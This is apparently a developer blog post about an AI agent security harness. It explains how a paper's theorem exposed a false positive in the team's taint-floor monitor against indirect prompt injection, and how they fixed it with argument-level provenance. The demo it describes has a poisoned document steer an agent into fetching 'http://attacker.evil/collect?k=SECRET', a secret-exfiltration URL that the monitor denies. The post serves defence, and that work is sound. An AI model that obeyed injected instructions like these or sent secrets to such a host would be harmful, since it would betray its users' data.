---
title: 'We Found a False Positive in Our Own Flagship Demo'
description: "A paper didn't propose a competing system — it proved a theorem, and the theorem was aimed at our taint floor. It was right. Here's the argument-level fix, and the one part of the paper we refused to adopt."
pubDate: 'Jul 18 2026'
heroImage: '../../assets/false-positive-argument-taint.jpg'
---

Most security papers give you a system to compare against. This one gave us a
**theorem**, and the theorem was pointed straight at our own code.

The paper is [*The Granularity Mismatch in Agent Security*](https://arxiv.org/abs/2605.11039)
(Fan et al., 2026), which introduces **PACT** — Provenance-Aware Capability
Contracts. Its central claim is uncomfortable in the best way: indirect prompt
injection is dangerous not when untrusted content is *in context*, but when it
**determines an authority-bearing argument** to a tool — the one that decides what the
call can *do*, like the destination URL or the shell command. So a monitor that decides
per *tool call* is operating at the wrong granularity — and any such monitor,
they prove, must be wrong somewhere.

We run exactly that kind of monitor. This post is what happened when we took the
theorem seriously and pointed it at our [taint floor](/blog/the-zombieagent-threat/).

## The floor, in one scalar

The harness enforces a **monotonic taint floor** — *taint* is the label we attach to any
value derived from an untrusted source, and *monotonic* means it only ever spreads, never
washes out. It's the same invariant behind the
[ZombieAgent post](/blog/the-zombieagent-threat/) and the
[subagent experiment](/blog/subagent-taint-experiment/). Acceptance invariant 7,
in `world-kernel`, is essentially one line:

```rust
// the taint floor — one scalar decides the whole call
if externally_effectful(side_effect) && taint.is_tainted() {
    return block();
}
```

The `taint` there is a single `Taint` scalar carried by `TaintContext`, and it is
computed as the **join of every prior output** in the session. One untrusted
document retrieved anywhere, and the whole next intent is `Tainted`. The check is
sound — once anything dirty is in play, nothing *effectful* — nothing that can reach
outside the sandbox, like a network call or a file write — gets out.

That single-scalar shape has a name in the PACT paper. It's **Definition 1: the
flat tool-level monitor** — one label per call, block <abbr title="if and only if">iff</abbr>
the action is externally effectful and the value is tainted. We did not borrow it from PACT; we arrived at
the same object independently. (The convergence runs deep: PACT's provenance merge
`⟨O, τ, B⟩` with `min(τ₁, τ₂)` is our monotonic taint, arrived at from the other
direction.) Which makes their **Theorem 3** land squarely on us:

> Any flat tool-level monitor incurs either a false positive or a false negative
> in a mixed-trust environment.

Not "sometimes, empirically." *Must*, by proof. So one of two things was true of
our floor: it silently lets something dangerous through, or it blocks something
benign. We don't have false negatives — the floor is conservative to a fault. That
leaves the false positive. The theorem told us it exists; it didn't tell us where.

## The witness was already in our demo

It was in the flagship. `poisoned_knowledge_demo` — our cross-layer showcase —
retrieves a poisoned document, then runs three `fetch_web` calls. Two of them:

- **Step 2** — a fetch to `http://attacker.evil/collect?k=SECRET`. The URL is
  derived from the injected instruction in the poisoned doc. **Denied.** Correct.
- **Step 3** — the *identical* fetch to `https://docs.example/guide` from earlier
  in the demo. The URL is a **hardcoded clean constant**. Also **denied**.

We had shipped step 3 as a *feature*: "same call, opposite verdict — the session
learned something and clamped down." Through PACT's lens it's the false positive
Theorem 3 promised. The authority-bearing argument — the `url` — is clean-origin.
Only the *ambient* session is tainted. The flat monitor can't tell "the poison
bound the URL" (step 2) from "the URL is a clean constant, the session merely has
dirt in it somewhere" (step 3), because by the time the floor runs, the
per-argument provenance is already gone — flattened into one scalar.

We built a witness that drives the **real kernel** on all three, alongside a
minimal argument-level check on the provenance the flat monitor throws away:

```text
scenario                           flat       L2       note
1. legit fetch, clean session      ALLOW      ALLOW    both allow — agree
2. exfil: URL derived from poison  DENY       BLOCK    both block — no false negative
3. legit fetch, tainted session    DENY       ALLOW    ◀ FLAT BLOCKS, L2 ALLOWS — the witness
```

Scenario 3 is the theorem made concrete, in our own repository.

## The fork: adopt the enforcement, refuse the inference

Here is where you have to read PACT carefully, because it contains two very
different things, and our whole thesis turns on keeping them apart.

PACT's **enforcement** is deterministic and design-time: given argument roles and
provenance, the decision is "only lattice comparisons, set intersections, and
certificate-scope checks," linear in the number of arguments. **No model in the
loop.** That is directly adoptable — it's the same kind of object as our kernel.

But PACT's **deployment** infers those roles and that provenance at runtime "by
exact structural matching, role-aware heuristics, and **an LLM classifier for
remaining ambiguous arguments**." That last clause is a language model in the
runtime trust path — a direct violation of [our first principle](/blog/why-deny-is-dangerous/):
nothing stochastic decides what is allowed. And it costs them, exactly where you'd
expect: **77.4% provenance accuracy** on real MCP tools. A gate that is right three
times in four is not a gate.

So we made the split the paper itself invites (§3.5, "the formal role of PACT is to
isolate the enforcement layer"): **take the enforcement layer, refuse the inference
pipeline.** Our argument roles don't come from a classifier — they come from the
human-authored `WorldManifest` at design time. Contracts are specified *by
construction*. PACT's 77.4% weakness is precisely the move we already refuse to make.

## The fix, without touching the floor

Three changes, and the floor rule itself never moved:

1. **Roles are manifest data.** Each argument can carry an `ArgRole`; `Target`,
   `Command`, and `Credential` are authority-bearing. `fetch_web` opts in with one
   line — `arg_roles: { url: Target }`. Not code, not a model. Data.
2. **`TaintContext` carries a per-argument map** alongside the scalar. The scalar
   stays as the fallback.
3. **The floor is fed a better number.** A new `effective_floor_taint()` computes
   the taint the **unchanged** `check_taint` judges by: when an action declares no
   roles, it returns the ambient scalar (today's behavior, byte-for-byte
   compatible); when it does, it returns the join over *authority-bearing arguments
   only*. Content and selectors can be as dirty as they like — they don't bind
   authority.

Then the piece that makes it real: a deterministic **data-flow producer**
(`agent-core::arg_provenance`) that fills the per-argument map from actual data
flow — the no-LLM half of PACT's §3.4. It is aggressively **fail-closed** — when it can't
prove something safe, it defaults to the restrictive answer:

- An argument is `Clean` **only with positive proof** — its value appears verbatim
  in the trusted user request.
- It is `Tainted` **only** if verbatim-derived from a tainted output.
- Otherwise it is **omitted**, and the call falls back to the ambient floor.

No proof of clean origin, no relaxation. The scalar floor is the floor; L2 only
ever refines *within* it.

## The result

Run it through the real kernel and the witness resolves:

- **Step 3** (clean constant URL, tainted session) — now **ALLOWED**. The utility
  we were destroying is recovered.
- **Step 2** (URL derived from the poison) — still **DENIED**. The exfil never had
  a clean-origin argument to stand on.

**152 tests pass**, and the false positive in our flagship demo is now an explicit,
passing assertion rather than a feature we misread. Backward compatible by
construction: an action with no declared roles behaves exactly as it did yesterday.

## The honest caveat

The floor was never *wrong*. It was **sound and maximally conservative** —
over-approximating because it couldn't prove the URL was clean, so it assumed the
worst. The fix didn't relax a safety property; it *fed the same property better
information*.

And the recovery has a hard edge, on purpose. The producer catches **verbatim**
data flow. Paraphrase the poisoned instruction, or summarize it, and its influence
on an argument is no longer a string match — it falls back to the ambient floor and
the call is blocked again. That is exactly the ambiguous case PACT hands to its LLM
classifier. We don't. We would rather over-block deterministically than guess
correctly 77% of the time, because a gate you can't trust is worse than a gate that
occasionally says no. Recover utility where origin is *provable*; stay closed where
it isn't.

## The takeaway

This is the Flywheel working as designed. A real paper — not an assertion, not a
vibe — pointed a theorem at our code. The theorem found a real defect: a false
positive we had shipped as a feature. The fix refined the kernel without weakening
it, and drew the deterministic/stochastic line in exactly the same place we always
draw it — adopt the proof, refuse the classifier.

Argument-level provenance turned "same call, opposite verdict" from a slogan into a
property we can prove one argument at a time. The floor still never decreases. It
just finally knows which argument it's afraid of.
